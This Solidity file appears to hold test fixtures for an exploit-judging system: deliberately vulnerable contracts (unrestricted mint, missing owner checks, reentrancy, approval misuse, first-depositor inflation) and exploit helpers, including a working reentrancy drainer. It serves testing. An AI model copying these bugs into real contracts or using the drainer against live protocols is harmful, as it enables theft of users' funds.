// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// Judge test fixtures only (ticket #10): one small contract per R4.10 scenario, deployed on
// anvil beside the demo protocol (demo/src) to make committed block headers and proofs.
// Nothing in the judge knows about any of them (D11).

interface IToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// The Protocol's own token, with the bug of rows 11a–11c: anyone can mint any amount.
contract BuggyToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Rows 2a, 2b, 3 and 14: an owner-only rescue, a public sweep to the treasury (by design:
/// it moves funds only to the treasury), and a freeze that forgets its owner check.
contract GuardedVault {
    IToken public immutable token;
    address public immutable owner;
    address public immutable treasury;
    bool public frozen;

    constructor(IToken token_, address treasury_) {
        token = token_;
        owner = msg.sender;
        treasury = treasury_;
    }

    function rescue(address to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        require(!frozen, "frozen");
        token.transfer(to, amount);
    }

    function sweep() external {
        require(!frozen, "frozen");
        token.transfer(treasury, token.balanceOf(address(this)));
    }

    /// BUG: no owner check, and no unfreeze: anyone can lock the funds for good.
    function freeze() external {
        frozen = true;
    }
}

/// A constant-product pool of a token against native coin, no fee: a dependency in rows
/// 4, 6 and 11c, and the price oracle an exploit can move in the R4.9 test.
contract Pool {
    IToken public immutable token;

    constructor(IToken token_) {
        token = token_;
    }

    receive() external payable {}

    function buyToken() external payable returns (uint256 out) {
        uint256 reserveNative = address(this).balance - msg.value;
        uint256 reserveToken = token.balanceOf(address(this));
        out = reserveToken * msg.value / (reserveNative + msg.value);
        token.transfer(msg.sender, out);
    }

    function sellToken(uint256 amount) external returns (uint256 out) {
        uint256 reserveToken = token.balanceOf(address(this));
        out = address(this).balance * amount / (reserveToken + amount);
        token.transferFrom(msg.sender, address(this), amount);
        payable(msg.sender).transfer(out);
    }

    /// Spot price: wei per 10^18 token units.
    function price() external view returns (uint256) {
        return address(this).balance * 1e18 / token.balanceOf(address(this));
    }
}

/// Row 5: a lender whose one loan is under water; anyone may repay the debt and take the
/// collateral, which is worth more than the debt (the liquidation bonus).
contract Lender {
    IToken public immutable token;
    uint256 public debt;

    constructor(IToken token_, uint256 debt_) {
        token = token_;
        debt = debt_;
    }

    function liquidate() external payable {
        require(debt > 0 && msg.value == debt, "repay the debt");
        debt = 0;
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}

interface IFlashBorrower {
    function onFlashLoan(uint256 amount) external;
}

/// Row 7: a free flash loan of its whole token balance, repaid in the same call.
contract FlashLender {
    IToken public immutable token;

    constructor(IToken token_) {
        token = token_;
    }

    function flashLoan(uint256 amount) external {
        uint256 before = token.balanceOf(address(this));
        token.transfer(msg.sender, amount);
        IFlashBorrower(msg.sender).onFlashLoan(amount);
        require(token.balanceOf(address(this)) >= before, "not repaid");
    }
}

/// Rows 8 and 9: a native-coin bank that pays out before it books the withdrawal.
contract EtherBank {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    /// BUG: reentrancy. The balance is cleared after the payment.
    function withdraw() external {
        uint256 amount = balance[msg.sender];
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "payment failed");
        balance[msg.sender] = 0;
    }
}

/// Row 11b: a covered vault that swaps the Protocol's token for USDC one to one.
contract SwapVault {
    IToken public immutable token;
    IToken public immutable usdc;

    constructor(IToken token_, IToken usdc_) {
        token = token_;
        usdc = usdc_;
    }

    function swap(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        usdc.transfer(msg.sender, amount);
    }
}

/// Row 13: a router that forgets to check who may move whose approval.
contract Router {
    /// BUG: `from` should be msg.sender.
    function pull(IToken token, address from, address to, uint256 amount) external {
        token.transferFrom(from, to, amount);
    }
}

/// Row 15: a share vault open to the first-depositor inflation attack. The attacker's
/// profit needs a victim's later deposit, which no exploit can include.
contract ShareVault {
    IToken public immutable token;
    uint256 public totalShares;
    mapping(address => uint256) public shares;

    constructor(IToken token_) {
        token = token_;
    }

    function deposit(uint256 amount) external {
        uint256 held = token.balanceOf(address(this));
        uint256 minted = totalShares == 0 ? amount : amount * totalShares / held;
        token.transferFrom(msg.sender, address(this), amount);
        shares[msg.sender] += minted;
        totalShares += minted;
    }

    function redeem(uint256 count) external {
        uint256 amount = count * token.balanceOf(address(this)) / totalShares;
        shares[msg.sender] -= count;
        totalShares -= count;
        token.transfer(msg.sender, amount);
    }
}

/// Row 16: a missing access check the owner can patch.
contract PatchableVault {
    IToken public immutable token;
    address public immutable owner;
    bool public patched;

    constructor(IToken token_) {
        token = token_;
        owner = msg.sender;
    }

    /// BUG until patched: anyone can withdraw anything.
    function withdrawTo(address to, uint256 amount) external {
        require(!patched, "patched");
        token.transfer(to, amount);
    }

    function patch() external {
        require(msg.sender == owner, "not owner");
        patched = true;
    }
}

// ---- Exploit helpers: created by a fresh account during the replay ------------------------

/// Rows 8 and 9: re-enters the bank until it is empty; `sweep` sends the proceeds on.
contract BankDrainer {
    EtherBank public immutable bank;

    constructor(EtherBank bank_) {
        bank = bank_;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        uint256 stake = bank.balance(address(this));
        if (address(bank).balance >= stake && stake > 0) bank.withdraw();
    }

    function sweep(address payable to) external {
        to.transfer(address(this).balance);
    }
}

interface IDepositVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

/// Row 7: borrows the lender's tokens, deposits them in a vault and takes them out again,
/// and repays.
contract FlashBorrower is IFlashBorrower {
    FlashLender public immutable lender;
    IDepositVault public immutable vault;

    constructor(FlashLender lender_, IDepositVault vault_) {
        lender = lender_;
        vault = vault_;
    }

    function run(uint256 amount) external {
        lender.flashLoan(amount);
    }

    function onFlashLoan(uint256 amount) external {
        IToken token = lender.token();
        token.approve(address(vault), amount);
        vault.deposit(amount);
        vault.withdraw(amount);
        token.transfer(address(lender), amount);
    }
}
